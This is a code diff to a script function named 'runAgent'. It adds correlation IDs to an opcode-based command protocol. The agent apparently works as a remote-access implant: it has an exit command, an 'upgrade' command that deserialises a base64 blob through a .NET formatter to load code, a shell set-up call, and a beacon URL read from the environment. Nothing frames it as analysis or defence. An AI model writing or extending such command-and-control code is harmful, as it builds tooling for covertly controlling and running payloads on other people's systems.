@@ -198,11 +198,17 @@ function runAgent() {
             if (base64.charAt(base64.length - 2) == '=') padding++;
             return Math.floor(base64.length / 4) * 3 - padding;
         }
+        // Command layout: [opcode][corrId:u32le][payload...]. Every reply echoes the id
+        // after its status: [status:u32le][corrId:u32le]. Id 0 = unmatched.
+        var corrId = bytes.length >= 5
+            ? ((bytes[1] | (bytes[2] << 8) | (bytes[3] << 16) | (bytes[4] << 24)) >>> 0)
+            : 0;
+        function reply(status) { return u32Bytes(status).concat(u32Bytes(corrId)); }
         if (bytes[0] == 10) { exiting = true; return null; }
         if (bytes[0] == 11) {
             try {
                 var payloadText = '';
-                for (var i = 1; i < bytes.length; i += 4096) {
+                for (var i = 5; i < bytes.length; i += 4096) {
                     var chunk = '';
                     for (var j = i; j < i + 4096 && j < bytes.length; j++) chunk += String.fromCharCode(bytes[j]);
                     payloadText += chunk;
@@ -239,11 +245,11 @@ function runAgent() {
                     blobFormatter.Deserialize_2(base64ToStream(blobB64, base64Length(blobB64)));
                 }
                 log('upgrade: deserialize done');
-                return u32Bytes(0);
-            } catch (e) { log('upgrade failed: ' + (e && e.message ? e.message : e)); return u32Bytes(1); }
+                return reply(0);
+            } catch (e) { log('upgrade failed: ' + (e && e.message ? e.message : e)); return reply(1); }
         }
         log('command opcode ' + bytes[0] + ' unknown — replying status 2');
-        return u32Bytes(2);
+        return reply(2);
     }
     ensureShell();
     var beaconUrl = readEnv('H_URL');
